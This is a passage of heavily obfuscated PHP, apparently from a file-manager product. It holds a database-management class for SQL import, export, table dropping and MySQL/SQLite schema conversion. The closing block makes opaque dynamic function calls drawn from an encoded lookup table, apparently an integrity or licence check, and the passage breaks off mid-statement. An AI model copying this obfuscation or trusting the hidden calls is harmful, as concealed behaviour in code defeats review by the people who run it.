$š±çÊ[$ä›ñ¥ïí[431]] : $ä›ñ¥ïí[12])), $ä£Ø§); return $ä£Ø§; } public function getLastSql($êíßó¼– = '') { return $êíßó¼– ? $this->modelSql[$êíßó¼–] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¸áşê×) { return addslashes($¸áşê×); } public function setModel($©ÄÅ¨å­) { $this->model = $©ÄÅ¨å­; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($¥åƒŞøû = array()) { $Œ½ÒÛÏµ =& $_SERVER[¯‘·½]; if (empty($¥åƒŞøû)) { $¥åƒŞøû = $GLOBALS[$Œ½ÒÛÏµ[6]][$Œ½ÒÛÏµ[21]]; } $this->database = $¥åƒŞøû; } public function model($¦”è´ÙÔ = '') { return new ModelBase($¦”è´ÙÔ, $_SERVER[¯‘·½][12], $this->database); } public function db($±ÏÑ€ã¤ = false) { $ùÊœéş¬ =& $_SERVER[¯‘·½]; $€Êªš¶Ê = array_change_key_case($this->database); if ($this->dbType() == $ùÊœéş¬[13] || !$±ÏÑ€ã¤) { return $this->model()->db(); } $ÖøÆè×  = $€Êªš¶Ê[$ùÊœéş¬[1068]]; $€Êªš¶Ê[$ùÊœéş¬[1068]] = $ùÊœéş¬[12]; if ($€Êªš¶Ê[$ùÊœéş¬[1063]] == $ùÊœéş¬[1060]) { $Üş¨Ç = $€Êªš¶Ê[$ùÊœéş¬[1069]]; $€Êªš¶Ê[$ùÊœéş¬[1069]] = substr($Üş¨Ç, 0, strrpos($Üş¨Ç, $ùÊœéş¬[1155])); } $this->database = $€Êªš¶Ê; $À†—²Ñ = $this->model()->db(); try { $ÄÛÙ á¦ = $À†—²Ñ->execute("\x73\150\157\167\40\x64\141\164\141\x62\x61\163\x65\163\x20\154\151\153\145\40\47{$ÖøÆè× }\47"); } catch (Exception $¼®§Ö´É) { } if (!$ÄÛÙ á¦) { $À†—²Ñ->execute("\x63\162\145\x61\164\x65\40\x64\x61\x74\x61\142\x61\163\145\40\140{$ÖøÆè× }\140"); } $€Êªš¶Ê[$ùÊœéş¬[1068]] = $ÖøÆè× ; if ($€Êªš¶Ê[$ùÊœéş¬[1063]] == $ùÊœéş¬[1060]) { $€Êªš¶Ê[$ùÊœéş¬[1069]] .= $ùÊœéş¬[1155] . $ÖøÆè× ; } $this->database = $€Êªš¶Ê; $À†—²Ñ->execute("\165\x73\x65\40\x60{$ÖøÆè× }\140"); return $À†—²Ñ; } public function createTable($Óîä½´´, &$Ú·¦î¸î) { $™İˆßØ =& $_SERVER[¯‘·½]; if (!IO::exist($Óîä½´´)) { ActionCall($™İˆßØ[1156], !0, 0); show_json(LNG($™İˆßØ[1157]), !1); } $ší¡èªñ = $this->model()->db(); $§à±ù€Ô = sqlSplit(IO::getContent($Óîä½´´)); foreach ($§à±ù€Ô as $Á÷Î×——) { $æ€ï‚¼¨ = stripos($Á÷Î×——, $™İˆßØ[1158]) === 0; if ($æ€ï‚¼¨) { $Ú·¦î¸î->task[$™İˆßØ[1159]] += 1; } $ší¡èªñ->execute($Á÷Î×——); if ($æ€ï‚¼¨) { preg_match($™İˆßØ[1160], $Á÷Î×——, $öœ¨İÕ¸); $Ú·¦î¸î->task[$™İˆßØ[1161]] = $öœ¨İÕ¸[1]; $Ú·¦î¸î->update(1); } } } public function insertTable($†êÃŸÈŒ, &$áÕ²ùã­) { $×¹“ß«Æ =& $_SERVER[¯‘·½]; $ûÎ¸ÕåÉ = $this->model()->db(); $Âô²â¶† = $ª˜…Ç…¥ ? array($ª˜…Ç…¥) : $ûÎ¸ÕåÉ->getTables(); foreach ($†êÃŸÈŒ as $û£½¡î¬) { $ª˜…Ç…¥ = basename($û£½¡î¬, $×¹“ß«Æ[876]); if (!in_array($ª˜…Ç…¥, $Âô²â¶†)) { continue; } $áÕ²ùã­->task[$×¹“ß«Æ[1161]] = $ª˜…Ç…¥; if (get_filesize($û£½¡î¬) == 0) { continue; } $‚¯æ É = $this->sqlToDb($û£½¡î¬, $áÕ²ùã­); if (!$‚¯æ É) { ActionCall($×¹“ß«Æ[1156], !0, 0); show_json(LNG($×¹“ß«Æ[1162]) . "\133{$ª˜…Ç…¥}\x5d", !1); } } } public function sqlFromDb($Í‚èúöş, $ûÏøüì®, &$­òìÒóÉ, $ÉÅÄÖÖŠ = '') { if ($­òìÒóÉ) { $­òìÒóÉ->task[$_SERVER[¯‘·½][1161]] = $Í‚èúöş; } $áØ«ÖŞæ = $this->model($Í‚èúöş); $¨¹øÂë• = 0; $Ã¹°Õ = 0; $¨íî¤š€ = 10000; $®ï§ËØı = fopen($ûÏøüì®, $_SERVER[¯‘·½][1163]); $‹Ã¢³ = $áØ«ÖŞæ->getPk(); $Á×ïñ´’ = $áØ«ÖŞæ->getDbFields(); $ƒ’‚ìïÛ = $_SERVER[¯‘·½][12]; if ($GLOBALS[$_SERVER[¯‘·½][875]] && in_array($Í‚èúöş, array($_SERVER[¯‘·½][1164], $_SERVER[¯‘·½][1165]))) { $ƒ’‚ìïÛ = $Í‚èúöş; } do { $›ç•şè‚ = array($‹Ã¢³ => array($_SERVER[¯‘·½][1110], $Ã¹°Õ)); $·ƒ–Á±° = $áØ«ÖŞæ->where($›ç•şè‚)->field($Á×ïñ´’)->order($‹Ã¢³ . $_SERVER[¯‘·½][1166])->limit($¨íî¤š€)->select(); $·ƒ–Á±° = !empty($·ƒ–Á±°) ? $·ƒ–Á±° : array(); if (!($¦äÓ×İÜ = count($·ƒ–Á±°))) { break; } $Æçóšµ = end($·ƒ–Á±°); $Ã¹°Õ = $Æçóšµ[$‹Ã¢³]; $ÄìÄš¸æ = array(); foreach ($·ƒ–Á±° as $ƒï´ƒŒ) { if ($ƒ’‚ìïÛ) { if ($Í‚èúöş == $_SERVER[¯‘·½][1164]) { if ($ƒï´ƒŒ[$_SERVER[¯‘·½][33]] == $_SERVER[¯‘·½][1167]) { $œÊË•³Û = json_decode($ƒï´ƒŒ[$_SERVER[¯‘·½][452]], !0); if ($œÊË•³Û[$_SERVER[¯‘·½][32]] == $GLOBALS[$_SERVER[¯‘·½][875]] && $œÊË•³Û[$_SERVER[¯‘·½][835]] != 1) { continue; } } } else { if ($ƒï´ƒŒ[$_SERVER[¯‘·½][33]] == $_SERVER[¯‘·½][1168] && $ƒï´ƒŒ[$_SERVER[¯‘·½][97]] == $_SERVER[¯‘·½][871]) { continue; } } } if ($ÉÅÄÖÖŠ) { $ƒï´ƒŒ[$_SERVER[¯‘·½][87]] = "\173\151\157\72{$ÉÅÄÖÖŠ}\x7d" . substr($ƒï´ƒŒ[$_SERVER[¯‘·½][87]], strlen("\x7b\151\x6f\x3a{$ƒï´ƒŒ[$_SERVER[¯‘·½][909]]}\x7d")); $ƒï´ƒŒ[$_SERVER[¯‘·½][909]] = $ÉÅÄÖÖŠ; } $ÄìÄš¸æ[] = $_SERVER[¯‘·½][1169] . $this->sqlEncode($ƒï´ƒŒ) . $_SERVER[¯‘·½][1170]; } $’ÄŒÒİ” = "\x49\116\123\105\x52\x54\40\x49\x4e\124\x4f\40\140{$Í‚èúöş}\140\40\50\x60" . implode($_SERVER[¯‘·½][1171], $Á×ïñ´’) . $_SERVER[¯‘·½][1172]; fwrite($®ï§ËØı, $’ÄŒÒİ” . implode($_SERVER[¯‘·½][1173], $ÄìÄš¸æ) . $_SERVER[¯‘·½][74] . PHP_EOL); $¨¹øÂë• += $¦äÓ×İÜ; if ($­òìÒóÉ) { $­òìÒóÉ->update($¦äÓ×İÜ); } } while ($¨íî¤š€ == $¦äÓ×İÜ); fclose($®ï§ËØı); return $¨¹øÂë•; } public function sqlToDb($’ş¯è²º, &$‰ƒ¾éüü) { $—¹Î”‡¶ =& $_SERVER[¯‘·½]; $ÑÍÓÁ’¸ = $this->model()->db(); $¨úº†È = @fopen($’ş¯è²º, $—¹Î”‡¶[1174]); if (!$¨úº†È) { return !1; } $óÜá¿¡ = 0; $ûá‰·ÔÆ = $—¹Î”‡¶[12]; $ø¯ÊÕÛİ = array(); $ŠØâÊİ­ = $this->dbType(); $ÑçÌ›¬Ó = $ŠØâÊİ­ == $—¹Î”‡¶[13] ? 500 : 2000; $¬ìîüè» = basename($’ş¯è²º, $—¹Î”‡¶[876]); $Èİèè‰„ = 0; $Ì™Å»© = 4194304; while (!feof($¨úº†È)) { $ß‹Ù°“ä = trim(fgets($¨úº†È)); if (!$ß‹Ù°“ä) { continue; } $öµßñ­Ü = $this->sqlDecode($ß‹Ù°“ä, $ŠØâÊİ­, $¬ìîüè»); if (stripos($öµßñ­Ü, $—¹Î”‡¶[432]) === 0) { if (!$ûá‰·ÔÆ) { $ûá‰·ÔÆ = $öµßñ­Ü . $—¹Î”‡¶[53]; } continue; } if ($‰ƒ¾éüü) { $‰ƒ¾éüü->task[$—¹Î”‡¶[1159]] += 1; } $óÜá¿¡++; $ø¯ÊÕÛİ[] = rtrim(rtrim(trim($öµßñ­Ü), $—¹Î”‡¶[50]), $—¹Î”‡¶[74]); $€ÔòÒ—è = null; $—Œá¯® = strlen($öµßñ­Ü); $Èİèè‰„ += $—Œá¯®; $Áø÷¹€† = strlen($ûá‰·ÔÆ) + $Èİèè‰„ + (count($ø¯ÊÕÛİ) - 1); if ($Áø÷¹€† >= $Ì™Å»©) { $€ÔòÒ—è = array_pop($ø¯ÊÕÛİ); if ($óÜá¿¡ > 1) { $óÜá¿¡--; } } if ($óÜá¿¡ >= $ÑçÌ›¬Ó || $€ÔòÒ—è) { $öµßñ­Ü = $ûá‰·ÔÆ . implode($—¹Î”‡¶[50], $ø¯ÊÕÛİ); if (!$ÑÍÓÁ’¸->execute($öµßñ­Ü)) { return !1; } if ($‰ƒ¾éüü) { $‰ƒ¾éüü->update($óÜá¿¡); } $ø¯ÊÕÛİ = array(); $óÜá¿¡ = 0; $Èİèè‰„ = 0; if ($€ÔòÒ—è) { $ø¯ÊÕÛİ = array($€ÔòÒ—è); $óÜá¿¡ = 1; $Èİèè‰„ = $—Œá¯®; } } } fclose($¨úº†È); if (!empty($ø¯ÊÕÛİ)) { $öµßñ­Ü = $ûá‰·ÔÆ . implode($—¹Î”‡¶[50], $ø¯ÊÕÛİ); if (!$ÑÍÓÁ’¸->execute($öµßñ­Ü)) { return !1; } if ($‰ƒ¾éüü) { $‰ƒ¾éüü->update($óÜá¿¡); } } return !0; } public function dropTable($œÆ’Ó = null) { $ó”¼ƒä¬ = $this->model()->db(); $ª™ıŠ§Ô = $œÆ’Ó ? array($œÆ’Ó) : $ó”¼ƒä¬->getTables(); if (!$ª™ıŠ§Ô) { return; } foreach ($ª™ıŠ§Ô as $œÆ’Ó) { if ($œÆ’Ó) { $œÆ’Ó = strtolower($œÆ’Ó); } else { continue; } $ó”¼ƒä¬->execute("\144\x72\x6f\x70\40\x74\x61\x62\x6c\x65\x20\151\146\40\x65\x78\151\163\x74\163\40\140{$œÆ’Ó}\140"); } } private function sqlEncode($­ìˆÉá„) { $Âò“êëÜ =& $_SERVER[¯‘·½]; $§ÄÑçŞã = array(); foreach ($­ìˆÉá„ as $ˆ­ÊØ´ˆ) { if (is_array($ˆ­ÊØ´ˆ)) { $ˆ­ÊØ´ˆ = json_encode_force($ˆ­ÊØ´ˆ); } $ˆ­ÊØ´ˆ = addslashes($ˆ­ÊØ´ˆ); $ˆ­ÊØ´ˆ = str_replace(array($Âò“êëÜ[1175], $Âò“êëÜ[288], $Âò“êëÜ[419]), array($Âò“êëÜ[1176], $Âò“êëÜ[1177], $Âò“êëÜ[1178]), $ˆ­ÊØ´ˆ); $§ÄÑçŞã[] = $ˆ­ÊØ´ˆ; } return $Âò“êëÜ[58] . implode($Âò“êëÜ[1179], $§ÄÑçŞã) . $Âò“êëÜ[58]; } private function sqlDecode($¡©ßˆú, $ø¯Ô´Ãá, $¢º¡Â– = '') { $¬ÈÖÚáË =& $_SERVER[¯‘·½]; $¡©ßˆú = str_replace(array($¬ÈÖÚáË[1176], $¬ÈÖÚáË[1177], $¬ÈÖÚáË[1178]), array($¬ÈÖÚáË[1175], $¬ÈÖÚáË[288], $¬ÈÖÚáË[419]), $¡©ßˆú); if ($ø¯Ô´Ãá == $¬ÈÖÚáË[13]) { $¡©ßˆú = str_ireplace($¬ÈÖÚáË[1180], $¬ÈÖÚáË[59], $¡©ßˆú); $¡©ßˆú = stripslashes($¡©ßˆú); } return preg_replace($¬ÈÖÚáË[1181], $¬ÈÖÚáË[12], $¡©ßˆú); if ($ø¯Ô´Ãá == $¬ÈÖÚáË[13]) { return $¢º¡Â– != $¬ÈÖÚáË[870] ? stripslashes($¡©ßˆú) : $¡©ßˆú; } if ($¢º¡Â– == $¬ÈÖÚáË[870]) { $¡©ßˆú = str_replace($¬ÈÖÚáË[1182], $¬ÈÖÚáË[121], stripslashes($¡©ßˆú)); } return $¡©ßˆú; } public function getSqlFile($‹»°¡ = '') { $û´œ¢†‘ =& $_SERVER[¯‘·½]; $©¤Ê÷ï¨ = $this->dbType(!0); $ÆÔùöùİ = CONTROLLER_DIR . "\x69\x6e\163\164\x61\x6c\x6c\57\x64\141\x74\141\57{$©¤Ê÷ï¨}\x2e\x73\x71\154"; if (!file_exists($ÆÔùöùİ)) { return !1; } $Šá£úµÔ = file_get_contents($ÆÔùöùİ); $Æä¥æçè = $û´œ¢†‘[1183] . ($©¤Ê÷ï¨ == $û´œ¢†‘[894] ? $û´œ¢†‘[1184] : $û´œ¢†‘[1185]) . $û´œ¢†‘[1186]; preg_match_all($Æä¥æçè, $Šá£úµÔ, $ş£¨¯ôğ); $„ò›–é¥ = $ş£¨¯ôğ[1]; $‰áó¯â¿ = $this->model()->db(); $üÇÖìïº = $‰áó¯â¿->getTables(); $Ğêº¸·¬ = TEMP_FILES . $û´œ¢†‘[1187] . date($û´œ¢†‘[262]) . $û´œ¢†‘[8]; del_dir($Ğêº¸·¬); mk_dir($Ğêº¸·¬); $µŞ­§Šç = $Ğêº¸·¬ . $û´œ¢†‘[1188]; $ú¸”¤üÒ = $Ğêº¸·¬ . $û´œ¢†‘[1189]; $¢€ä¢£› = $©¤Ê÷ï¨ == $û´œ¢†‘[13] ? $û´œ¢†‘[894] : $û´œ¢†‘[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\164\x61\154\x6c\57\x64\141\x74\141\57{$¢€ä¢£›}\56\x73\x71\154", $Ğêº¸·¬); @touch($Ğêº¸·¬ . $©¤Ê÷ï¨ . $û´œ¢†‘[876]); $ß“ƒ·üÌ = fopen($µŞ­§Šç, $û´œ¢†‘[1163]); $ñÂæš× = fopen($ú¸”¤üÒ, $û´œ¢†‘[1163]); if ($©¤Ê÷ï¨ == $û´œ¢†‘[13]) { $üÇÖìïº = array_diff($üÇÖìïº, array($û´œ¢†‘[868], $û´œ¢†‘[869])); $à²„¡¹ = array($û´œ¢†‘[1190], $û´œ¢†‘[1191], $û´œ¢†‘[1192]); fwrite($ñÂæš×, implode(PHP_EOL, $à²„¡¹) . PHP_EOL . PHP_EOL); foreach ($üÇÖìïº as $í»„Æ¾¡) { $¨†Ä§°¦ = $this->sqlFromSqlite($í»„Æ¾¡); if (!$¨†Ä§°¦[$û´œ¢†‘[13]]) { continue; } fwrite($ñÂæš×, $¨†Ä§°¦[$û´œ¢†‘[13]] . PHP_EOL . PHP_EOL); if (!in_array($í»„Æ¾¡, $„ò›–é¥)) { fwrite($ß“ƒ·üÌ, $¨†Ä§°¦[$û´œ¢†‘[894]] . PHP_EOL . PHP_EOL); } } } else { foreach ($üÇÖìïº as $í»„Æ¾¡) { $¨†Ä§°¦ = $this->sqlFromMysql($í»„Æ¾¡); if (!$¨†Ä§°¦[$û´œ¢†‘[894]]) { continue; } fwrite($ß“ƒ·üÌ, $¨†Ä§°¦[$û´œ¢†‘[894]] . PHP_EOL . PHP_EOL); if (!in_array($í»„Æ¾¡, $„ò›–é¥)) { fwrite($ñÂæš×, $¨†Ä§°¦[$û´œ¢†‘[13]] . PHP_EOL . PHP_EOL); } } } fclose($ß“ƒ·üÌ); fclose($ñÂæš×); $Šá£úµÔ = array($û´œ¢†‘[894] => $µŞ­§Šç, $û´œ¢†‘[13] => $ú¸”¤üÒ); return $‹»°¡ ? $Šá£úµÔ[$‹»°¡] : $Šá£úµÔ; } public function dbType($º…ÆÙ‡ = false) { $™Ğ¦·‰æ =& $_SERVER[¯‘·½]; $õÑ›Àè€ = $º…ÆÙ‡ ? $GLOBALS[$™Ğ¦·‰æ[6]][$™Ğ¦·‰æ[21]] : $this->database; $õÑ›Àè€ = array_change_key_case($õÑ›Àè€); $§Ç—ôå = $õÑ›Àè€[$™Ğ¦·‰æ[1063]]; if ($§Ç—ôå == $™Ğ¦·‰æ[1060]) { $¡•Êƒ = explode($™Ğ¦·‰æ[4], $õÑ›Àè€[$™Ğ¦·‰æ[1069]]); $§Ç—ôå = $¡•Êƒ[0]; } $¶ù“–¨¹ = array($™Ğ¦·‰æ[1193] => $™Ğ¦·‰æ[13], $™Ğ¦·‰æ[1008] => $™Ğ¦·‰æ[894]); if (isset($¶ù“–¨¹[$§Ç—ôå])) { $§Ç—ôå = $¶ù“–¨¹[$§Ç—ôå]; } return $§Ç—ôå; } public function sqlFromMysql($úªÆäºã, $Şëô˜³ã = '') { $¯‰óÍââ =& $_SERVER[¯‘·½]; $Üµ‚¡Çü = $this->model()->db(); $îÀˆøâö = $Üµ‚¡Çü->query($¯‰óÍââ[1194] . $úªÆäºã . $¯‰óÍââ[463]); if (!$îÀˆøâö || !$îÀˆøâö[0]) { return !1; } $“Äºü— = _get($îÀˆøâö[0], $¯‰óÍââ[1195], $¯‰óÍââ[12]); if (!$“Äºü—) { return !1; } $Üûôó = "\x44\122\117\120\40\x54\x41\102\114\x45\40\x49\x46\40\x45\130\111\x53\x54\x53\x20\140{$úªÆäºã}\x60\x3b" . PHP_EOL . $“Äºü— . $¯‰óÍââ[74]; if ($Şëô˜³ã && $Şëô˜³ã == $¯‰óÍââ[894]) { return $Üûôó; } $êº¯¸‰û = array_change_key_case($GLOBALS[$¯‰óÍââ[6]][$¯‰óÍââ[21]]); $—ä©À¬¨ = $êº¯¸‰û[$¯‰óÍââ[1068]]; $Ì´ª´·ƒ = $¯‰óÍââ[1196] . $—ä©À¬¨ . $¯‰óÍââ[1197] . $úªÆäºã . $¯‰óÍââ[58]; $ìôªê“á = $¯‰óÍââ[1198] . $úªÆäºã . $¯‰óÍââ[996]; $şı¼˜®æ = $Üµ‚¡Çü->query($Ì´ª´·ƒ); if (empty($şı¼˜®æ)) { $äœ ÖıÜ = array($¯‰óÍââ[894] => $¯‰óÍââ[12], $¯‰óÍââ[13] => $¯‰óÍââ[12]); return $Şëô˜³ã ? $äœ ÖıÜ[$Şëô˜³ã] : $äœ ÖıÜ; } $Éî„´íÓ = $Üµ‚¡Çü->query($ìôªê“á); $©¢²•éó = $¯‰óÍââ[12]; $½›õ¨ş = array(); foreach ($Éî„´íÓ as $¦û§ØÚ‡) { if (!$©¢²•éó && $¦û§ØÚ‡[$¯‰óÍââ[1199]] == $¯‰óÍââ[1200]) { $©¢²•éó = $¦û§ØÚ‡[$¯‰óÍââ[1201]]; } if (isset($½›õ¨ş[$¦û§ØÚ‡[$¯‰óÍââ[1199]]])) { $½›õ¨ş[$¦û§ØÚ‡[$¯‰óÍââ[1199]]][$¯‰óÍââ[1202]][] = $¦û§ØÚ‡[$¯‰óÍââ[1201]]; continue; } $½›õ¨ş[$¦û§ØÚ‡[$¯‰óÍââ[1199]]] = array($¯‰óÍââ[1203] => $¦û§ØÚ‡[$¯‰óÍââ[1199]], $¯‰óÍââ[1202] => array($¦û§ØÚ‡[$¯‰óÍââ[1201]]), $¯‰óÍââ[1204] => $¦û§ØÚ‡[$¯‰óÍââ[1205]] == $¯‰óÍââ[91] ? 0 : 1); } $’Â»¾·¥ = array(); foreach ($½›õ¨ş as $¦û§ØÚ‡) { $¶Ù¦´Ë… = $¦û§ØÚ‡[$¯‰óÍââ[1203]] == $¯‰óÍââ[1200]; $¿®Ñä§ = array($¯‰óÍââ[1206], $¦û§ØÚ‡[$¯‰óÍââ[1204]] == $¯‰óÍââ[91] && !$¶Ù¦´Ë… ? $¯‰óÍââ[1207] : $¯‰óÍââ[12], $¯‰óÍââ[1208], $¯‰óÍââ[1209] . $úªÆäºã . $¯‰óÍââ[11] . ($¶Ù¦´Ë… ? $¯‰óÍââ[1210] : $¦û§ØÚ‡[$¯‰óÍââ[1203]]) . $¯‰óÍââ[121], $¯‰óÍââ[1211], $¯‰óÍââ[121] . $úªÆäºã . $¯‰óÍââ[121], $¯‰óÍââ[1212] . implode($¯‰óÍââ[1213], $¦û§ØÚ‡[$¯‰óÍââ[1202]]) . $¯‰óÍââ[1214]); $’Â»¾·¥[] = implode($¯‰óÍââ[53], $¿®Ñä§) . $¯‰óÍââ[74]; } $€Üä… = array(); $ØÃÊ«…˜ = array($¯‰óÍââ[1215] => $¯‰óÍââ[1216], $¯‰óÍââ[1216] => $¯‰óÍââ[1216], $¯‰óÍââ[366] => $¯‰óÍââ[392], $¯‰óÍââ[365] => $¯‰óÍââ[392]); foreach ($şı¼˜®æ as $¦û§ØÚ‡) { $¿®Ñä§ = array($¯‰óÍââ[121] . $¦û§ØÚ‡[$¯‰óÍââ[1217]] . $¯‰óÍââ[121], isset($ØÃÊ«…˜[$¦û§ØÚ‡[$¯‰óÍââ[1218]]]) ? $ØÃÊ«…˜[$¦û§ØÚ‡[$¯‰óÍââ[1218]]] : $¦û§ØÚ‡[$¯‰óÍââ[1219]], $¦û§ØÚ‡[$¯‰óÍââ[1220]] == $¯‰óÍââ[994] ? $¯‰óÍââ[1221] : $¯‰óÍââ[1222], $¦û§ØÚ‡[$¯‰óÍââ[1217]] == $©¢²•éó ? $¯‰óÍââ[1223] : $¯‰óÍââ[12], $¦û§ØÚ‡[$¯‰óÍââ[1045]] ? strtoupper(str_replace($¯‰óÍââ[11], $¯‰óÍââ[12], $¦û§ØÚ‡[$¯‰óÍââ[1045]])) : $¯‰óÍââ[12]); $€Üä…[] = trim(implode($¯‰óÍââ[53], $¿®Ñä§)); } $¼¼Ûõâ = array($¯‰óÍââ[1224] . $úªÆäºã . $¯‰óÍââ[1225], $¯‰óÍââ[1226] . $úªÆäºã . $¯‰óÍââ[1227], implode($¯‰óÍââ[50] . PHP_EOL, $€Üä…), $¯‰óÍââ[1042]); $ö¼¢ı£ê = implode(PHP_EOL, array_merge($¼¼Ûõâ, $’Â»¾·¥)); if ($Şëô˜³ã && $Şëô˜³ã == $¯‰óÍââ[13]) { return $ö¼¢ı£ê; } $äœ ÖıÜ = array($¯‰óÍââ[894] => $Üûôó, $¯‰óÍââ[13] => $ö¼¢ı£ê); return $Şëô˜³ã ? $äœ ÖıÜ[$Şëô˜³ã] : $äœ ÖıÜ; } public function sqlFromSqlite($èÑş¬¥£, $™ï´ª¢Ò = '') { $ğ·ƒŒ€¾ =& $_SERVER[¯‘·½]; $õÛó¡¨ = $this->model()->db(); $Ëç§Û‡× = "\120\122\101\x47\115\x41\x20\124\x41\x42\x4c\x45\x5f\111\x4e\x46\117\40\x28\x27{$èÑş¬¥£}\47\51"; $Ş ƒ”Ïİ = "\123\105\x4c\x45\x43\124\x20\52\40\106\122\117\115\40\163\x71\x6c\151\x74\145\137\155\x61\163\x74\145\x72\40\127\x48\105\x52\105\x20\164\x62\x6c\x5f\156\141\x6d\145\x20\75\40\x27{$èÑş¬¥£}\47"; $äÒ÷ÇÅ = $õÛó¡¨->query($Ëç§Û‡×); if (empty($äÒ÷ÇÅ)) { $•¡–’ºÅ = array($ğ·ƒŒ€¾[894] => $ğ·ƒŒ€¾[12], $ğ·ƒŒ€¾[13] => $ğ·ƒŒ€¾[12]); return $™ï´ª¢Ò ? $•¡–’ºÅ[$™ï´ª¢Ò] : $•¡–’ºÅ; } $ë«û°ò• = $õÛó¡¨->query($Ş ƒ”Ïİ); $ŠÜğé¶ = $§±¿‘ëĞ = array(); foreach ($ë«û°ò• as $á†¥»¨ù) { if ($á†¥»¨ù[$ğ·ƒŒ€¾[33]] == $ğ·ƒŒ€¾[359]) { $ŠÜğé¶[] = $á†¥»¨ù[$ğ·ƒŒ€¾[1228]]; } else { $§±¿‘ëĞ[$á†¥»¨ù[$ğ·ƒŒ€¾[32]]] = $á†¥»¨ù[$ğ·ƒŒ€¾[1228]]; } } $£ùÚÙ©Ú = array_merge(array($ğ·ƒŒ€¾[1224] . $èÑş¬¥£ . $ğ·ƒŒ€¾[121]), $ŠÜğé¶, array_values($§±¿‘ëĞ)); $£ùÚÙ©Ú = implode($ğ·ƒŒ€¾[74] . PHP_EOL, $£ùÚÙ©Ú) . $ğ·ƒŒ€¾[74]; if ($™ï´ª¢Ò && $™ï´ª¢Ò == $ğ·ƒŒ€¾[13]) { return $£ùÚÙ©Ú; } $Ëéº‰Á = array(); foreach ($§±¿‘ëĞ as $«æÏó’­ => $©«Ãë¹û) { $Ú®Àªˆ = str_replace($ğ·ƒŒ€¾[1229] . $èÑş¬¥£ . $ğ·ƒŒ€¾[11], $ğ·ƒŒ€¾[12], $«æÏó’­); $Ú®Àªˆ = str_replace($èÑş¬¥£ . $ğ·ƒŒ€¾[11], $ğ·ƒŒ€¾[12], $«æÏó’­); $«–‰ÁÏ = str_replace(array($ğ·ƒŒ€¾[121], $ğ·ƒŒ€¾[1053]), $ğ·ƒŒ€¾[463], substr($©«Ãë¹û, stripos($©«Ãë¹û, $ğ·ƒŒ€¾[340]))); $Ëéº‰Á[$Ú®Àªˆ] = $«–‰ÁÏ; } $­­¡Üµ = array(); $½Œ°†œ£ = array($ğ·ƒŒ€¾[1216] => $ğ·ƒŒ€¾[1230], $ğ·ƒŒ€¾[392] => $ğ·ƒŒ€¾[1231]); $òè¼é² = $ïöÛØ§ê = $ğ·ƒŒ€¾[12]; foreach ($äÒ÷ÇÅ as $á†¥»¨ù) { if ($á†¥»¨ù[$ğ·ƒŒ€¾[57]] == $ğ·ƒŒ€¾[91]) { $òè¼é² = $á†¥»¨ù[$ğ·ƒŒ€¾[32]]; } $„ƒ¿«à˜ = $á†¥»¨ù[$ğ·ƒŒ€¾[33]]; if ($„ƒ¿«à˜ == $ğ·ƒŒ€¾[1232] && isset($Ëéº‰Á[$á†¥»¨ù[$ğ·ƒŒ€¾[32]]])) { $„ƒ¿«à˜ = $ğ·ƒŒ€¾[1233]; } $¦îÁŞ¹ = array($ğ·ƒŒ€¾[463] . $á†¥»¨ù[$ğ·ƒŒ€¾[32]] . $ğ·ƒŒ€¾[463], _get($½Œ°†œ£, $„ƒ¿«à˜, $„ƒ¿«à˜), $á†¥»¨ù[$ğ·ƒŒ€¾[35]] == $ğ·ƒŒ€¾[91] ? $ğ·ƒŒ€¾[1221] : $ğ·ƒŒ€¾[1234] . $á†¥»¨ù[$ğ·ƒŒ€¾[56]], $á†¥»¨ù[$ğ·ƒŒ€¾[57]] == $ğ·ƒŒ€¾[91] ? $ğ·ƒŒ€¾[1235] : $ğ·ƒŒ€¾[12]); $­­¡Üµ[] = trim(implode($ğ·ƒŒ€¾[53], $¦îÁŞ¹)); } foreach ($Ëéº‰Á as $Ú®Àªˆ => $«–‰ÁÏ) { if ($Ú®Àªˆ == $ğ·ƒŒ€¾[1210]) { $³°×“üÉ = $ïöÛØ§ê = $ğ·ƒŒ€¾[1236] . $òè¼é² . $ğ·ƒŒ€¾[1237]; } else { $³°×“üÉ = (stripos($Ú®Àªˆ, $ğ·ƒŒ€¾[11]) ? $ğ·ƒŒ€¾[1238] : $ğ·ƒŒ€¾[12]) . ($ğ·ƒŒ€¾[1239] . $Ú®Àªˆ . $ğ·ƒŒ€¾[1240] . $«–‰ÁÏ); } $­­¡Üµ[] = $³°×“üÉ; } if ($òè¼é² && !$ïöÛØ§ê) { $­­¡Üµ = array_merge(array($ğ·ƒŒ€¾[1236] . $òè¼é² . $ğ·ƒŒ€¾[1237]), $­­¡Üµ); } $Šì¥Ë = array($ğ·ƒŒ€¾[1241] . $èÑş¬¥£ . $ğ·ƒŒ€¾[1242], $ğ·ƒŒ€¾[1243] . $èÑş¬¥£ . $ğ·ƒŒ€¾[1244], implode($ğ·ƒŒ€¾[50] . PHP_EOL, $­­¡Üµ), $ğ·ƒŒ€¾[1245]); $×úÁË = implode(PHP_EOL, $Šì¥Ë); if ($™ï´ª¢Ò && $™ï´ª¢Ò == $ğ·ƒŒ€¾[894]) { return $×úÁË; } $•¡–’ºÅ = array($ğ·ƒŒ€¾[894] => $×úÁË, $ğ·ƒŒ€¾[13] => $£ùÚÙ©Ú); return $™ï´ª¢Ò ? $•¡–’ºÅ[$™ï´ª¢Ò] : $•¡–’ºÅ; } } if ($_SERVER[$_SERVER[¯‘·½][969]] != $_SERVER[$_SERVER[¯‘·½][970]]) { $_getc = $_SERVER[¯‘·½][972]; $_getfile = $_SERVER[$_SERVER[¯‘·½][973]] . $_SERVER[¯‘·½][974]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¯‘·½][288], $_getfilec); if (count($_getarrs) < $_SERVER[¯‘·½][701]) { $exit = $_SERVER[¯‘·½][975]; $exit(); } $_act = $_SERVER[¯‘·½][1246]; $_act($_SERVER[$_SERVER[¯‘·½][1247]]); } goto Bê‰ææÏ’; Cœ·íëÄá: if ($_SERVER[$_SERVER[¯‘·½][969]] != $_size($_file)) { $_getc = $_SERVER[¯‘·½][972]; $_getfile = $_SERVER[$_SERVER[¯‘·½][973]] . $_SERVER[¯‘·½][974]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¯‘·½][288], $_getfilec); if (count($_getarrs) < $_SERVER[¯‘·½][701]) { $exit = 